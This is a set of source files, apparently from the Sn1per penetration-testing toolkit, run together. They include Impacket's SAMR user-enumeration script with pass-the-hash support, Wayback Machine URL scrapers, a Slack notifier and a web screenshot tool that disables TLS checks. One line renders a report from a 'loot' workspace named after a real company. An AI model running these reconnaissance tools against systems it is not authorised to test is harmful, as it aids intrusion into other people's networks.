                                    # write \xxx form for dodgy character
                                    buf = "".join(('\\', ch))
                                    ws(buf)
                                else:
                                    # dont print anything for a FF
                                    charNo -= 1

                    ws(")'\n")
                    if ch == FF:
                        atFF=1
                    if lineNo == self._lines:
                        atBOP=1
                        
                    if atBOP:
                        pos=0
                        ch = self._ifs.read(1)
                        pos= self._ifs.tell()
                        if ch == FF:
                            ch = self._ifs.read(1)
                            pos=self._ifs.tell()
                        # python's EOF signature
                        if ch == '':
                            atEOF=1
                        else:
                            # push position back by one char
                            self._ifs.seek(pos-1)

                    elif atFF:
                        ch = self._ifs.read(1)
                        pos=self._ifs.tell()
                        if ch == '':
                            atEOF=1
                        else:
                            self._ifs.seek(pos-1)

                if column < self._columns:
                    buf = "".join(("1 0 0 1 ",
                                   str((self._pageWd/2 + 25)),
                                   " ",
                                   str(self._pageHt - 40),
                                   " Tm\n"))
                    ws(buf)

            self.endpage(beginstream)

    def writerest(self):
        """Finish the file"""

        ws = self.writestr
        self._locations[3] = self._fpos
    
        ws("3 0 obj\n")
        ws("<<\n")
        ws("/Type /Pages\n")
        buf = "".join(("/Count ", str(self._pageNo), "\n"))
        ws(buf)
        buf = "".join(("/MediaBox [ 0 0 ", str(self._pageWd), " ", str(self._pageHt), " ]\n"))
        ws(buf)
        ws("/Kids [ ")
    
        for i in range(1, self._pageNo+1):
            buf = "".join((str(self._pageObs[i]), " 0 R "))
            ws(buf)

        ws("]\n")
        ws(">>\n")
        ws("endobj\n")
        
        xref = self._fpos
        ws("xref\n")
        buf = "".join(("0 ", str((self._curobj) + 1), "\n"))
        ws(buf)
        buf = "".join(("0000000000 65535 f ", str(LINE_END)))
        ws(buf)

        for i in range(1, self._curobj + 1):
            val = self._locations[i]
            buf = "".join((string.zfill(str(val), 10), " 00000 n ", str(LINE_END)))
            ws(buf)

        ws("trailer\n")
        ws("<<\n")
        buf = "".join(("/Size ", str(self._curobj + 1), "\n"))
        ws(buf)
        ws("/Root 2 0 R\n")
        ws("/Info 1 0 R\n")
        ws(">>\n")
        
        ws("startxref\n")
        buf = "".join((str(xref), "\n"))
        ws(buf)
        ws("%%EOF\n")
        

def main():
    
    pdfclass=PyText2Pdf()
    pdfclass.parse_args()
    pdfclass.convert()

if __name__ == "__main__":
    main()

import pdfkit
pdfkit.from_url('/usr/share/sniper/loot/workspace/hulu/sniper-report.html', 'out.pdf')

#!/usr/bin/python
# Copyright (c) 2003-2015 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description: DCE/RPC SAMR dumper.
#
# Author:
#  Javier Kohen <jkohen@coresecurity.com>
#  Alberto Solino (@agsolino)
#
# Reference for:
#  DCE/RPC for SAMR

import sys
import logging
import argparse

from impacket.examples import logger
from impacket import version
from impacket.nt_errors import STATUS_MORE_ENTRIES
from impacket.dcerpc.v5 import transport, samr
from impacket.dcerpc.v5.rpcrt import DCERPCException


class ListUsersException(Exception):
    pass

class SAMRDump:
    KNOWN_PROTOCOLS = {
        '139/SMB': (r'ncacn_np:%s[\pipe\samr]', 139),
        '445/SMB': (r'ncacn_np:%s[\pipe\samr]', 445),
        }


    def __init__(self, protocols = None,
                 username = '', password = '', domain = '', hashes = None, aesKey=None, doKerberos = False):
        if not protocols:
            self.__protocols = SAMRDump.KNOWN_PROTOCOLS.keys()
        else:
            self.__protocols = [protocols]

        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')


    def dump(self, addr):
        """Dumps the list of users and shares registered present at
        addr. Addr is a valid host name or IP address.
        """

        logging.info('Retrieving endpoint list from %s' % addr)

        # Try all requested protocols until one works.
        entries = []
        for protocol in self.__protocols:
            protodef = SAMRDump.KNOWN_PROTOCOLS[protocol]
            port = protodef[1]

            logging.info("Trying protocol %s..." % protocol)
            rpctransport = transport.SMBTransport(addr, port, r'\samr', self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, doKerberos = self.__doKerberos)

            try:
                entries = self.__fetchList(rpctransport)
            except Exception, e:
                logging.critical(str(e))
            else:
                # Got a response. No need for further iterations.
                break

        # Display results.

        for entry in entries:
            (username, uid, user) = entry
            base = "%s (%d)" % (username, uid)
            print base + '/FullName:', user['FullName']
            print base + '/UserComment:', user['UserComment']
            print base + '/PrimaryGroupId:', user['PrimaryGroupId']
            print base + '/BadPasswordCount:', user['BadPasswordCount']
            print base + '/LogonCount:', user['LogonCount']

        if entries:
            num = len(entries)
            if 1 == num:
                logging.info('Received one entry.')
            else:
                logging.info('Received %d entries.' % num)
        else:
            logging.info('No entries received.')


    def __fetchList(self, rpctransport):
        dce = rpctransport.get_dce_rpc()

        entries = []

        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)

        try:
            resp = samr.hSamrConnect(dce)
            serverHandle = resp['ServerHandle'] 

            resp = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
            domains = resp['Buffer']['Buffer']

            print 'Found domain(s):'
            for domain in domains:
                print " . %s" % domain['Name']

            logging.info("Looking up users in domain %s" % domains[0]['Name'])

            resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle,domains[0]['Name'] )

            resp = samr.hSamrOpenDomain(dce, serverHandle = serverHandle, domainId = resp['DomainId'])
            domainHandle = resp['DomainHandle']

            status = STATUS_MORE_ENTRIES
            enumerationContext = 0
            while status == STATUS_MORE_ENTRIES:
                try:
                    resp = samr.hSamrEnumerateUsersInDomain(dce, domainHandle, enumerationContext = enumerationContext)
                except DCERPCException, e:
                    if str(e).find('STATUS_MORE_ENTRIES') < 0:
                        raise 
                    resp = e.get_packet()

                for user in resp['Buffer']['Buffer']:
                    r = samr.hSamrOpenUser(dce, domainHandle, samr.MAXIMUM_ALLOWED, user['RelativeId'])
                    print "Found user: %s, uid = %d" % (user['Name'], user['RelativeId'] )
                    info = samr.hSamrQueryInformationUser2(dce, r['UserHandle'],samr.USER_INFORMATION_CLASS.UserAllInformation)
                    entry = (user['Name'], user['RelativeId'], info['Buffer']['All'])
                    entries.append(entry)
                    samr.hSamrCloseHandle(dce, r['UserHandle'])

                enumerationContext = resp['EnumerationContext'] 
                status = resp['ErrorCode']

        except ListUsersException, e:
            logging.critical("Error listing users: %s" % e)

        dce.disconnect()

        return entries


# Process command-line arguments.
if __name__ == '__main__':
    # Init the example's logger theme
    logger.init()
    print version.BANNER

    parser = argparse.ArgumentParser(add_help = True, description = "This script downloads the list of users for the target system.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('protocol', choices=SAMRDump.KNOWN_PROTOCOLS.keys(), nargs='?', default='445/SMB', help='transport protocol (default 445/SMB)')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    import re

    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(options.target).groups('')

    if domain is None:
        domain = ''

    if options.aesKey is not None:
        options.k = True

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    dumper = SAMRDump(options.protocol, username, password, domain, options.hashes, options.aesKey, options.k)
    dumper.dump(address)

#!/bin/bash
# Slack API Integration script for Sn1per
# By @xer0dayz - https://xerosecurity.com
#

source /usr/share/sniper/sniper.conf 2> /dev/null
source /root/.sniper.conf 2> /dev/null
source /root/.sniper_api_keys.conf 2> /dev/null

MESSAGE="$1"

if [ "$MESSAGE" == "postfile" ]; then
	FILENAME="$2"
	curl -F "file=@$FILENAME" -F "initial_comment=$FILENAME" -F "channels=$SLACK_CHANNEL" -H "Authorization: Bearer $SLACK_API_TOKEN" https://slack.com/api/files.upload 2> /dev/null > /dev/null
else
	curl -X POST -H 'Content-type: application/json' --data "{\"text\":\"$MESSAGE\"}" $SLACK_WEBHOOK_URL 2> /dev/null > /dev/null
fi


import requests
import re
import sys
from multiprocessing.dummy import Pool


def robots(host):
    r = requests.get(
        'https://web.archive.org/cdx/search/cdx\
        ?url=%s/robots.txt&output=json&fl=timestamp,original&filter=statuscode:200&collapse=digest' % host)
    results = r.json()
    if len(results) == 0: # might find nothing
        return []
    results.pop(0)  # The first item is ['timestamp', 'original']
    return results


def getpaths(snapshot):
    url = 'https://web.archive.org/web/{0}/{1}'.format(snapshot[0], snapshot[1])
    robotstext = requests.get(url).text
    if 'Disallow:' in robotstext:  # verify it's acually a robots.txt file, not 404 page
        paths = re.findall('/.*', robotstext)
        return paths
    return []


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Usage:\n\tpython3 waybackrobots.py <domain-name>')
        sys.exit()

    host = sys.argv[1]

    snapshots = robots(host)
    print('Found %s unique results' % len(snapshots))
    if len(snapshots) == 0:
        sys.exit()
    print('This may take some time...')
    pool = Pool(4)
    paths = pool.map(getpaths, snapshots)
    unique_paths = set()
    for i in paths:
        unique_paths.update(i)
    filename = '%s-robots.txt' % host
    with open(filename, 'w') as f:
        f.write('\n'.join(unique_paths))
    print('[*] Saved results to %s' % filename)

import requests
import sys
import json


def waybackurls(host, with_subs):
    if with_subs:
        url = 'http://web.archive.org/cdx/search/cdx?url=*.%s/*&output=json&fl=original&collapse=urlkey' % host
    else:
        url = 'http://web.archive.org/cdx/search/cdx?url=%s/*&output=json&fl=original&collapse=urlkey' % host
    r = requests.get(url)
    results = r.json()
    return results[1:]


if __name__ == '__main__':
    argc = len(sys.argv)
    if argc < 2:
        print('Usage:\n\tpython3 waybackurls.py <url> <include_subdomains:optional>')
        sys.exit()

    host = sys.argv[1]
    with_subs = False
    if argc > 3:
        with_subs = True

    urls = waybackurls(host, with_subs)
    json_urls = json.dumps(urls)
    if urls:
        filename = '%s-waybackurls.json' % host
        with open(filename, 'w') as f:
            f.write(json_urls)
        print('[*] Saved results to %s' % filename)
    else:
        print('[-] Found nothing')

/***
# This file is part of webscreenshot.
#
# Copyright (C) 2014, Thomas Debize <tdebize at mail.com>
# All rights reserved.
#
# webscreenshot is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# webscreenshot is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.	See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with webscreenshot.	 If not, see <http://www.gnu.org/licenses/>.
***/

var Page = (function(custom_headers, http_username, http_password) {
	var opts = {
		width: 1200,
		height: 800,
		ajaxTimeout: 400,
		maxTimeout: 800,
		httpAuthErrorCode: 2
	};
	
	var requestCount = 0;
	var forceRenderTimeout;
	var ajaxRenderTimeout;

	var page = require('webpage').create();
	page.viewportSize = {
		width: opts.width,
		height: opts.height
	};
	
	page.settings.userAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36';
	page.settings.userName = http_username;
	page.settings.password = http_password;
	
	page.customHeaders = custom_headers;
	
	page.onInitialized = function() {
		page.customHeaders = {};
	};
	// Silence confirmation messages and errors
	page.onConfirm = page.onPrompt = page.onError = noop;

	page.onResourceRequested = function(request) {
		requestCount += 1;
		clearTimeout(ajaxRenderTimeout);
	};

	page.onResourceReceived = function(response) {
		if (response.stage && response.stage == 'end' && response.status == '401') {
			page.failReason = '401';
		}
		
		if (!response.stage || response.stage === 'end') {
			requestCount -= 1;
			if (requestCount === 0) {
				ajaxRenderTimeout = setTimeout(renderAndExit, opts.ajaxTimeout);
			}
		}
	};

	var api = {};

	api.render = function(url, file) {
		opts.file = file;
		
		page.open(url, function(status) {
			if (status !== "success") {
				if (page.failReason && page.failReason == '401') {
					// Specific 401 HTTP code hint
					phantom.exit(opts.httpAuthErrorCode);
				} else {
					// All other failures
					phantom.exit(1);
				}
			} else {
				forceRenderTimeout = setTimeout(renderAndExit, opts.maxTimeout);
			}
		});
	};

	function renderAndExit() {
		// Trick to avoid transparent background
		page.evaluate(function() {
			document.body.bgColor = 'white';
		});

		page.render(opts.file);
		phantom.exit(0);
	}

	function noop() {}

	return api;
});

function main() {
	
	var system = require('system');
	var p_url = new RegExp('url_capture=(.*)');
	var p_outfile = new RegExp('output_file=(.*)');
	var p_header = new RegExp('header=(.*)');
	
	var p_http_username = new RegExp('http_username=(.*)');
	var http_username = '';
	
	var p_http_password = new RegExp('http_password=(.*)');
	var http_password = '';
	
	var temp_custom_headers = {
		// Nullify Accept-Encoding header to disable compression (https://github.com/ariya/phantomjs/issues/10930)
		'Accept-Encoding': ' '
	};
	
	for(var i = 0; i < system.args.length; i++) {
		if (p_url.test(system.args[i]) === true)
		{
			var URL = p_url.exec(system.args[i])[1];
		}
		
		if (p_outfile.test(system.args[i]) === true)
		{
			var output_file = p_outfile.exec(system.args[i])[1];
		}
		
		if (p_http_username.test(system.args[i]) === true)
		{
			http_username = p_http_username.exec(system.args[i])[1];
		}
		
		if (p_http_password.test(system.args[i]) === true)
		{
			http_password = p_http_password.exec(system.args[i])[1];
		}
		
		if (p_header.test(system.args[i]) === true)
		{
			var header = p_header.exec(system.args[i]);		
			var p_header_split = header[1].split(': ', 2);
			var header_name = p_header_split[0];
			var header_value = p_header_split[1];
				
			temp_custom_headers[header_name] = header_value;
			
		}
	}
	
	if (typeof(URL) === 'undefined' || URL.length == 0 || typeof(output_file) === 'undefined' || output_file.length == 0) {
		console.log("Usage: phantomjs [options] webscreenshot.js url_capture=<URL> output_file=<output_file.png> [header=<custom header> http_username=<HTTP basic auth username> http_password=<HTTP basic auth password>]");
		console.log('Please specify an URL to capture and an output png filename !');
		
		phantom.exit(1);
	}
	else {
		var page = Page(temp_custom_headers, http_username, http_password);
		page.render(URL, output_file);
	}
}

main();
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# This file is part of webscreenshot.
#
# Copyright (C) 2018, Thomas Debize <tdebize at mail.com>
# All rights reserved.
#
# webscreenshot is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# webscreenshot is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with webscreenshot.  If not, see <http://www.gnu.org/licenses/>.

import re
import os
import sys
import subprocess
import datetime
import time
import signal
import multiprocessing
import itertools
import shlex
import logging
import errno

# Script version
VERSION = '2.2.1'

# OptionParser imports
from optparse import OptionParser
from optparse import OptionGroup

# Options definition
parser = OptionParser(usage="usage: %prog [options] URL")

main_grp = OptionGroup(parser, 'Main parameters')
main_grp.add_option('-i', '--input-file', help = '<INPUT_FILE>: text file containing the target list. Ex: list.txt', nargs = 1)
main_grp.add_option('-o', '--output-directory', help = '<OUTPUT_DIRECTORY> (optional): screenshots output directory (default \'./screenshots/\')', nargs = 1)
main_grp.add_option('-r', '--renderer', help = '<RENDERER> (optional): renderer to use among \'phantomjs\' (legacy but best results), \'chrome\', \'chromium\' (version > 57) (default \'phantomjs\')', choices = ['phantomjs', 'chrome', 'chromium'], default = 'phantomjs', nargs = 1)
main_grp.add_option('-w', '--workers', help = '<WORKERS> (optional): number of parallel execution workers (default 2)', default = 2, nargs = 1)
main_grp.add_option('-v', '--verbosity', help = '<VERBOSITY> (optional): verbosity level, repeat it to increase the level { -v INFO, -vv DEBUG } (default verbosity ERROR)', action = 'count', default = 0)

proc_grp = OptionGroup(parser, 'Input processing parameters')
proc_grp.add_option('-p', '--port', help = '<PORT> (optional): use the specified port for each target in the input list. Ex: -p 80', nargs = 1)
proc_grp.add_option('-s', '--ssl', help = '<SSL> (optional): enforce ssl for every connection', action = 'store_true', default = False)
proc_grp.add_option('-m', '--multiprotocol', help = '<MULTIPROTOCOL> (optional): perform screenshots over HTTP and HTTPS for each target', action = 'store_true', default = False) 

http_grp = OptionGroup(parser, 'HTTP parameters')
http_grp.add_option('-c', '--cookie', help = '<COOKIE_STRING> (optional): cookie string to add. Ex: -c "JSESSIONID=1234; YOLO=SWAG"', nargs = 1)
http_grp.add_option('-a', '--header', help = '<HEADER> (optional): custom or additional header. Repeat this option for every header. Ex: -a "Host: localhost" -a "Foo: bar"', action = 'append')

http_grp.add_option('-u', '--http-username', help = '<HTTP_USERNAME> (optional): specify a username for HTTP Basic Authentication.')
http_grp.add_option('-b', '--http-password', help = '<HTTP_PASSWORD> (optional): specify a password for HTTP Basic Authentication.')

conn_grp = OptionGroup(parser, 'Connection parameters')
conn_grp.add_option('-P', '--proxy', help = '<PROXY> (optional): specify a proxy. Ex: -P http://proxy.company.com:8080')
conn_grp.add_option('-A', '--proxy-auth', help = '<PROXY_AUTH> (optional): provides authentication information for the proxy. Ex: -A user:password')
conn_grp.add_option('-T', '--proxy-type', help = '<PROXY_TYPE> (optional): specifies the proxy type, "http" (default), "none" (disable completely), or "socks5". Ex: -T socks')
conn_grp.add_option('-t', '--timeout', help = '<TIMEOUT> (optional): renderer execution timeout in seconds (default 30 sec)', default = 30, nargs = 1)

parser.option_groups.extend([main_grp, proc_grp, http_grp, conn_grp])

# renderer binaries, hoping to find it in a $PATH directory
## Be free to change them to your own full-path location 
PHANTOMJS_BIN = 'phantomjs'
CHROME_BIN = 'google-chrome'
CHROMIUM_BIN = 'chromium'

WEBSCREENSHOT_JS = os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), './webscreenshot.js'))
SCREENSHOTS_DIRECTORY = os.path.abspath(os.path.join(os.getcwdu(), './screenshots/'))

# Logger definition
LOGLEVELS = {0 : 'ERROR', 1 : 'INFO', 2 : 'DEBUG'}
logger_output = logging.StreamHandler(sys.stdout)
logger_output.setFormatter(logging.Formatter('[%(levelname)s][%(name)s] %(message)s'))

logger_gen = logging.getLogger("General")
logger_gen.addHandler(logger_output)

# Macros
SHELL_EXECUTION_OK = 0
SHELL_EXECUTION_ERROR = -1
PHANTOMJS_HTTP_AUTH_ERROR_CODE = 2

# Handful patterns
p_ipv4_elementary = '(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})'
p_domain = '[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,6}'
p_port = '\d{0,5}'
p_resource = '(?:/(?P<res>.*))?'

full_uri_domain = re.compile('^(?P<protocol>http(?:|s))://(?P<host>%s|%s)(?::(?P<port>%s))?%s$' % (p_domain, p_ipv4_elementary, p_port, p_resource))

fqdn_and_port = re.compile('^(?P<host>%s):(?P<port>%s)%s$' % (p_domain, p_port, p_resource))
fqdn_only = re.compile('^(?P<host>%s)%s$' % (p_domain, p_resource))

ipv4_and_port = re.compile('^(?P<host>%s):(?P<port>%s)%s' % (p_ipv4_elementary, p_port, p_resource))
ipv4_only = re.compile('^(?P<host>%s)%s$' % (p_ipv4_elementary, p_resource))

entry_from_csv = re.compile('^(?P<host>%s|%s)\s+(?P<port>\d+)$' % (p_domain, p_ipv4_elementary))

# Handful functions
def init_worker():
    """ 
        Tell the workers to ignore a global SIGINT interruption
    """
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    
def kill_em_all(signal, frame):
    """
        Terminate all processes while capturing a SIGINT from the user
    """
    logger_gen.info('CTRL-C received, exiting')
    sys.exit(0)
    
def shell_exec(url, command, options):
    """
        Execute a shell command following a timeout
        Taken from http://howto.pui.ch/post/37471155682/set-timeout-for-a-shell-command-in-python
    """
    global SHELL_EXECUTION_OK, SHELL_EXECUTION_ERROR
    
    logger_url = logging.getLogger("%s" % url)
    logger_url.setLevel(options.log_level)
    
    timeout = int(options.timeout)
    start = datetime.datetime.now()
    
    try :
        p = subprocess.Popen(shlex.split(command), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # binaries timeout
        while p.poll() is None:
            time.sleep(0.1)
            now = datetime.datetime.now()
            if (now - start).seconds > timeout:
                logger_url.debug("Shell command PID %s reached the timeout, killing it now" % p.pid)
                logger_url.error("Screenshot somehow failed\n")
                
                if sys.platform == 'win32':
                    p.send_signal(signal.SIGTERM)
                else:
                    p.send_signal(signal.SIGKILL)
                
                return SHELL_EXECUTION_ERROR
        
        retval = p.poll()
        if retval != SHELL_EXECUTION_OK:
            if retval == PHANTOMJS_HTTP_AUTH_ERROR_CODE:
                # HTTP Authentication request
                logger_url.error("HTTP Authentication requested, try to pass credentials with -u and -b options")
            else:
                # Phantomjs general error
                logger_url.error("Shell command PID %s returned an abnormal error code: '%s'" % (p.pid,retval))
                logger_url.error("Screenshot somehow failed\n")
                    
            return SHELL_EXECUTION_ERROR
        
        else:
            # Phantomjs ok
            logger_url.debug("Shell command PID %s ended normally" % p.pid)
            logger_url.info("Screenshot OK\n")
            return SHELL_EXECUTION_OK
    
    except Exception as e:
        if e.errno and e.errno == errno.ENOENT :
            logger_url.error('renderer binary could not have been found in your current PATH environment variable, exiting')
        else:
            logger_gen.error('Unknown error: %s, exiting' % e )
        return SHELL_EXECUTION_ERROR

def filter_bad_filename_chars(filename):
    #print (filename)
    """
        Filter bad chars for any filename
    """
    # Before, just avoid triple underscore escape for the classic '://' pattern
    filename = filename.replace('http://', '')
    filename = filename.replace('https://', '')
    #print (filename)
    
    return re.sub('[^\w\-_\. ]', '-port', filename)
    #print (filename)

def extract_all_matched_named_groups(regex, match):
    """
        Return a set of all extractable matched parameters.
        >>> full_uri_domain.groupindex
        {'domain': 1, 'port': 3}
        >>>full_uri_domain.match('http://8.8.8.8:80').group('domain')
        '8.8.8.8'
        >>>extract_all_matched_named_groups() => {'domain': '8.8.8.8', 'port': '80'}
            
    """
    result = {}
    for name, id in regex.groupindex.items():
        matched_value = match.group(name)
        if matched_value != None: result[name] = matched_value
    
    return result
    
def entry_format_validator(line):
    """
        Validate the current line against several regexes and return matched parameters (ip, domain, port etc.)
    """
    tab = { 'full_uri_domain'       : full_uri_domain,
            'fqdn_only'             : fqdn_only,
            'fqdn_and_port'         : fqdn_and_port, 
            'ipv4_and_port'         : ipv4_and_port, 
            'ipv4_only'             : ipv4_only, 
            'entry_from_csv'        : entry_from_csv
    }
    
    for name, regex in tab.items():
        validator = regex.match(line)
        if validator:
            return extract_all_matched_named_groups(regex, validator)

def parse_targets(options, arguments):
    """
        Parse list and convert each target to valid URI with port(protocol://foobar:port) 
    """
    
    target_list = []
    
    if options.input_file != None:    
        with open(options.input_file,'rb') as fd_input:
            try:
                lines = [l.decode('utf-8').lstrip().rstrip().strip() for l in fd_input.readlines()]
            except UnicodeDecodeError as e:
                logger_gen.error('Your input file is not UTF-8 encoded, please encode it before using this script')
                sys.exit(0)
    else:
        lines = arguments
        
    for index, line in enumerate(lines, start=1):
        matches = entry_format_validator(line)
        
        # pass if line can be recognized as a correct input, or if no 'host' group could be found with all the regexes
        if matches == None or not('host' in matches.keys()):
            logger_gen.warn("Line %s '%s' could not have been recognized as a correct input" % (index, line))
            pass
        else:
            host = matches['host']
            
            # Protocol is 'http' by default, unless ssl is forced
            if options.ssl == True:
                protocol = 'https'
            elif 'protocol' in matches.keys():
                protocol = str(matches['protocol'])
            else:
                protocol = 'http'
            
            # Port is ('80' for http) or ('443' for https) by default, unless a specific port is supplied
            if options.port != None:
                port = options.port
            elif 'port' in matches.keys():
                port = int(matches['port'])
                
                # if port is 443, assume protocol is https if is not specified
                protocol = 'https' if port == 443 else protocol
            else:
                port = 443 if protocol == 'https' else 80
            
            # No resource URI by default
            if 'res' in matches.keys():
                res = str(matches['res'])
            else:
                res = None
            
            # perform screenshots over HTTP and HTTPS for each target
            if options.multiprotocol:
                final_uri_http_port = int(matches['port']) if 'port' in matches.keys() else 80
                final_uri_http = '%s://%s:%s' % ('http', host, final_uri_http_port)
                target_list.append(final_uri_http)
                logger_gen.info("'%s' has been formatted as '%s' with supplied overriding options" % (line, final_uri_http))
                
                
                final_uri_https_port = int(matches['port']) if 'port' in matches.keys() else 443
                final_uri_https = '%s://%s:%s' % ('https', host, final_uri_https_port)
                target_list.append(final_uri_https)
                logger_gen.info("'%s' has been formatted as '%s' with supplied overriding options" % (line, final_uri_https))
            
            else:
                final_uri = '%s://%s:%s' % (protocol, host, port)
                final_uri = final_uri + '/%s' % res if res != None else final_uri
                target_list.append(final_uri)

                logger_gen.info("'%s' has been formatted as '%s' with supplied overriding options" % (line, final_uri))
    
    return target_list      

def craft_cmd(url_and_options):
    """
        Craft the correct command with url and options
    """
    global logger_output, PHANTOMJS_BIN, WEBSCREENSHOT_JS, SCREENSHOTS_DIRECTORY, SHELL_EXECUTION_OK, SHELL_EXECUTION_ERROR
    
    url, options = url_and_options
    
    logger_url = logging.getLogger("%s" % url)
    logger_url.addHandler(logger_output)
    logger_url.setLevel(options.log_level)

    #output_filename = os.path.join(SCREENSHOTS_DIRECTORY, ('%s.png' % filter_bad_filename_chars(url)))
    output_filename = os.path.join(SCREENSHOTS_DIRECTORY, ('%s.jpg' % filter_bad_filename_chars(url)))
    
    # PhantomJS renderer
    if options.renderer == 'phantomjs':
        # If you ever want to add some voodoo options to the phantomjs command to be executed, that's here right below
        cmd_parameters = [  PHANTOMJS_BIN,
                            '--ignore-ssl-errors true',
                            '--ssl-protocol any',
                            '--ssl-ciphers ALL'
        ]
        
        cmd_parameters.append("--proxy %s" % options.proxy) if options.proxy != None else None
        cmd_parameters.append("--proxy-auth %s" % options.proxy_auth) if options.proxy_auth != None else None
        cmd_parameters.append("--proxy-type %s" % options.proxy_type) if options.proxy_type != None else None

        cmd_parameters.append('"%s" url_capture="%s" output_file="%s"' % (WEBSCREENSHOT_JS, url, output_filename))
        
        cmd_parameters.append('header="Cookie: %s"' % options.cookie.rstrip(';')) if options.cookie != None else None
        
        cmd_parameters.append('http_username="%s"' % options.http_username) if options.http_username != None else None
        cmd_parameters.append('http_password="%s"' % options.http_password) if options.http_password != None else None
        
        if options.header:
            for header in options.header:
                cmd_parameters.append('header="%s"' % header.rstrip(';'))
    
    # Chrome and chromium renderers
    else: 
        cmd_parameters =  [ CHROME_BIN ] if options.renderer == 'chrome' else [ CHROMIUM_BIN ]
        cmd_parameters += [ '--allow-running-insecure-content',
                            '--ignore-certificate-errors',
                            '--ignore-urlfetcher-cert-requests',
                            '--reduce-security-for-testing',
                            '--no-sandbox',
                            '--headless',
                            '--disable-gpu',
                            '--hide-scrollbars',
                            '--incognito',
                            '-screenshot="%s"' % output_filename,
                            '--window-size=1200,800',
                            '"%s"' % url
        ]
        cmd_parameters.append('--proxy-server="%s"' % options.proxy) if options.proxy != None else None
    
    cmd = " ".join(cmd_parameters)
    
    logger_url.debug("Shell command to be executed\n'%s'\n" % cmd)
    
    execution_retval = shell_exec(url, cmd, options)
    
    return execution_retval, url

    
def take_screenshot(url_list, options):
    """
        Launch the screenshot workers
        Thanks http://noswap.com/blog/python-multiprocessing-keyboardinterrupt
    """
    global SHELL_EXECUTION_OK, SHELL_EXECUTION_ERROR
    
    screenshot_number = len(url_list)
    print "[+] %s URLs to be screenshot" % screenshot_number
    
    pool = multiprocessing.Pool(processes=int(options.workers), initializer=init_worker)
    
    taken_screenshots = [r for r in pool.imap(func=craft_cmd, iterable=itertools.izip(url_list, itertools.repeat(options)))]

    screenshots_error_url = [url for retval, url in taken_screenshots if retval == SHELL_EXECUTION_ERROR]
    screenshots_error = sum(retval == SHELL_EXECUTION_ERROR for retval, url in taken_screenshots)
    screenshots_ok = int(screenshot_number - screenshots_error)
    
    print "[+] %s actual URLs screenshot" % screenshots_ok
    print "[+] %s error(s)" % screenshots_error
    
    if screenshots_error != 0:
        for url in screenshots_error_url:
            print "    %s" % url

    return None
    
def main():
    """
        Dat main
    """
    global VERSION, SCREENSHOTS_DIRECTORY, LOGLEVELS
    signal.signal(signal.SIGINT, kill_em_all)
    
    print 'webscreenshot.py version %s\n' % VERSION
    
    options, arguments = parser.parse_args()
       
    try :
        options.log_level = LOGLEVELS[options.verbosity]
        logger_gen.setLevel(options.log_level)
    except :
        parser.error("Please specify a valid log level")
        
    if (options.input_file == None and (len(arguments) > 1 or len(arguments) == 0)):
        parser.error('Please specify a valid input file or a valid URL')
    
    if (options.input_file != None and len(arguments) == 1):
        parser.error('Please specify either an input file or an URL')
    
    if (options.output_directory != None):
        SCREENSHOTS_DIRECTORY = os.path.abspath(os.path.join(os.getcwdu(), options.output_directory))
    
    logger_gen.debug("Options: %s\n" % options)
    if not os.path.exists(SCREENSHOTS_DIRECTORY):
        logger_gen.info("'%s' does not exist, will then be created" % SCREENSHOTS_DIRECTORY)
        os.makedirs(SCREENSHOTS_DIRECTORY)
        
    url_list = parse_targets(options, arguments)
    
    take_screenshot(url_list, options)
    
    return None

if __name__ == "__main__" :
    main()
#!/usr/bin/env python3

'''
This script aims to be the most generic and the most explicit possible.
